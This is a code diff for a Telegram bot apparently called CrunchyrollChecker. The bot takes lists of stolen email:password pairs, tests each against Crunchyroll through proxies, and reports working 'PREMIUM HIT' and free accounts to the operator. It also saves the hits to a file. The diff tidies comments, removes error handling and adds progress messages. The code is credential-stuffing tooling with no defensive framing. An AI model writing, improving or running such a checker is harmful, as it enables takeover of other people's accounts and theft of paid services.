@@ -169,7 +169,7 @@ class CrunchyrollChecker:
 
 async def send_result(chat_id, result):
     if result['status'] == 'INVALID':
-        return  # ← Only change: completely silent for invalid
+        return
 
     capture = f"""
 {'='*70}
@@ -192,7 +192,7 @@ CHECKED BY: @Sudhakaran12
 
     if result['status'] == 'PREMIUM':
         await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
-    else:  # FREE
+    else:
         await bot.send_message(chat_id, f"<b>🆓 FREE ACCOUNT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
 
     with open("hits.txt", "a", encoding="utf-8") as f:
@@ -253,27 +253,27 @@ async def handle(message: types.Message):
 
     checker = CrunchyrollChecker(proxies)
 
-    await message.answer(f"🚀 Checking {len(lines)} combos...")
+    await message.answer(f"✅ Found {len(lines)} accounts. Checking...")
 
-    for line in lines:
-        try:
-            email, password = line.split(":", 1)
-            result = checker.check(email.strip(), password.strip())
+    for i, line in enumerate(lines, 1):
+        email, password = line.split(":", 1)
+        await message.answer(f"[{i}/{len(lines)}] Checking → {email}")
 
-            stats['checked'] += 1
-            if result['status'] == 'PREMIUM':
-                stats['premium'] += 1
-            elif result['status'] == 'FREE':
-                stats['free'] += 1
-            else:
-                stats['invalid'] += 1
+        result = checker.check(email.strip(), password.strip())
 
-            await send_result(message.from_user.id, result)
+        stats['checked'] += 1
+        if result['status'] == 'PREMIUM':
+            stats['premium'] += 1
+        elif result['status'] == 'FREE':
+            stats['free'] += 1
+        else:
+            stats['invalid'] += 1
 
-            await asyncio.sleep(1.5)
+        await send_result(message.from_user.id, result)
 
-        except:
-            continue
+        await asyncio.sleep(1.5)
+
+    await message.answer("✅ All accounts checked!")
 
 
 async def main():
